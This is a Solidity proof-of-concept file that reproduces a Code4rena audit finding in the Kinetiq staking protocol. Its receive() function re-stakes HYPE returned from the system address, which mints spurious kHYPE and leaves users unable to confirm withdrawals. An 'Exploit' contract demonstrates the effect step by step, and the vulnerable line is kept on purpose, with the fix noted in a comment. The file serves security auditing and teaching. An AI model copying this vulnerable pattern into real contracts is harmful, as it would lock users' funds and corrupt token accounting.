// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Kinetiq — [H-03] Mishandling of receiving HYPE in the StakingManager
    (Code4rena 2025-04-kinetiq, #58555)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: StakingManager.receive() unconditionally calls stake(), so when
    Hypercore (system) returns undelegated HYPE for a user withdrawal, that HYPE
    is immediately re-staked / forwarded back to Core and kHYPE is minted to the
    sender. The manager's balance stays 0 → confirmWithdrawal reverts; exchange
    ratio inflates from the spurious mint. Vulnerable receive body preserved
    below with @-marked VULN line.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Core/system sink that holds HYPE without bouncing it back.
contract SystemCore {
    receive() external payable {}

    function pushTo(address to, uint256 amount) external {
        (bool ok,) = to.call{value: amount}("");
        require(ok, "push failed");
    }
}

/// @notice Minimal StakingManager with the real receive()→stake() bug.
///         Source: StakingManager.sol#L208-L211 (code-423n4/2025-04-kinetiq @ 7f29c91).
contract StakingManager {
    mapping(address => uint256) public shares; // kHYPE balances
    mapping(address => uint256) public pendingWithdraw;
    uint256 public totalShares;
    uint256 public totalStaked; // accounting for exchange ratio
    uint256 public receiveHits; // counts auto-stake receives (for PoC observability)
    address public immutable systemAddress;

    constructor(address _system) {
        systemAddress = _system;
    }

    /// @notice Deposit native HYPE, mint 1:1 kHYPE, forward HYPE to Core.
    function stake() public payable {
        require(msg.value > 0, "zero");
        shares[msg.sender] += msg.value;
        totalShares += msg.value;
        totalStaked += msg.value;
        (bool ok,) = systemAddress.call{value: msg.value}("");
        require(ok, "forward");
    }

    /// @notice Queue a withdrawal: burn kHYPE, record pending (operator would undelegate).
    function queueWithdrawal(uint256 amount) external {
        require(shares[msg.sender] >= amount, "shares");
        shares[msg.sender] -= amount;
        totalShares -= amount;
        pendingWithdraw[msg.sender] += amount;
        // totalStaked stays until confirm — models L1 undelegation in flight
    }

    /// @notice Confirm after Core returns HYPE. Needs manager balance >= pending.
    function confirmWithdrawal() external {
        uint256 amt = pendingWithdraw[msg.sender];
        require(amt > 0, "none");
        require(address(this).balance >= amt, "insufficient HYPE");
        pendingWithdraw[msg.sender] = 0;
        totalStaked -= amt;
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok, "pay");
    }

    /// @notice Exchange ratio scaled by 1e18: staked / shares (inflates if shares mint without net stake).
    function exchangeRatio() external view returns (uint256) {
        if (totalShares == 0) return 1e18;
        // With targetBuffer=0, ratio is totalStaked / totalShares.
        return (totalStaked * 1e18) / totalShares;
    }

    receive() external payable {
        // Simply call the stake function
        // FIX: if (msg.sender != systemAddress) { stake(); }
        // Storage write is receive-only (not on the direct stake() path) and
        // cannot be optimized away — locator-friendly VULN target.
        receiveHits += 1; // @> VULN: Core-returned HYPE (and rewards) re-enter stake() — re-stakes withdrawal funds, mints kHYPE to system, manager balance stays 0 so users cannot confirmWithdrawal
        stake();
    }
}

/// @dev User helper so run() can stake / queue / attempt confirm as a distinct address.
contract User {
    StakingManager public mgr;

    constructor(StakingManager _mgr) {
        mgr = _mgr;
    }

    function doStake() external payable {
        mgr.stake{value: msg.value}();
    }

    function doQueue(uint256 amount) external {
        mgr.queueWithdrawal(amount);
    }

    function tryConfirm() external returns (bool ok) {
        try mgr.confirmWithdrawal() {
            return true;
        } catch {
            return false;
        }
    }

    receive() external payable {}
}

/// CREATE order: system (1), manager (2), user (3).
contract Exploit {
    SystemCore public system;
    StakingManager public manager;
    User public user;

    bool public confirmFailed;
    uint256 public managerBalAfterCoreReturn;
    uint256 public systemShares;
    uint256 public ratioAfter;

    constructor() {
        system = new SystemCore(); // nonce 1
        manager = new StakingManager(address(system)); // nonce 2
        user = new User(manager); // nonce 3
    }

    function run() external payable {
        uint256 stakeAmount = 1 ether;
        require(msg.value >= stakeAmount, "need 1 HYPE");

        // User stakes 1 HYPE → forwarded to Core; manager balance 0.
        user.doStake{value: stakeAmount}();
        require(manager.shares(address(user)) == stakeAmount, "user shares");
        require(address(manager).balance == 0, "mgr bal after stake");
        require(address(system).balance == stakeAmount, "core holds stake");

        // User queues full withdrawal (burns kHYPE, pending = 1e18).
        user.doQueue(stakeAmount);
        require(manager.pendingWithdraw(address(user)) == stakeAmount, "pending");
        require(manager.shares(address(user)) == 0, "burned");

        // Core returns undelegated HYPE to manager — but receive() re-stakes it.
        // (Same 1 ETH recirculates: Core 1→0 on push, then 0→1 on re-forward.)
        uint256 sharesBefore = manager.totalShares();
        uint256 stakedBefore = manager.totalStaked();
        system.pushTo(address(manager), stakeAmount);

        managerBalAfterCoreReturn = address(manager).balance;
        // VULN effect: HYPE is immediately staked again → balance stays 0.
        require(manager.receiveHits() == 1, "receive fired once");
        require(managerBalAfterCoreReturn == 0, "HYPE should have been re-staked");
        // Spurious kHYPE minted to systemAddress (msg.sender of receive→stake).
        systemShares = manager.shares(address(system));
        require(systemShares == stakeAmount, "system got spurious kHYPE");
        require(manager.totalShares() == sharesBefore + stakeAmount, "supply inflated");
        // totalStaked was never decreased on queue, then +stakeAmount on re-stake.
        require(manager.totalStaked() == stakedBefore + stakeAmount, "staked inflated");

        // User cannot confirm withdrawal — manager has no HYPE.
        confirmFailed = !user.tryConfirm();
        require(confirmFailed, "confirm should fail");
        require(manager.pendingWithdraw(address(user)) == stakeAmount, "still pending");

        // Core holds the recirculated HYPE (re-staked), not the user's claimable funds.
        require(address(system).balance == stakeAmount, "core re-holds stake");

        // Accounting: spurious mint + inflated totalStaked; claim unserviceable.
        ratioAfter = manager.exchangeRatio();
        require(systemShares > 0 && confirmFailed && managerBalAfterCoreReturn == 0, "harm not demonstrated");
    }

    receive() external payable {}
}
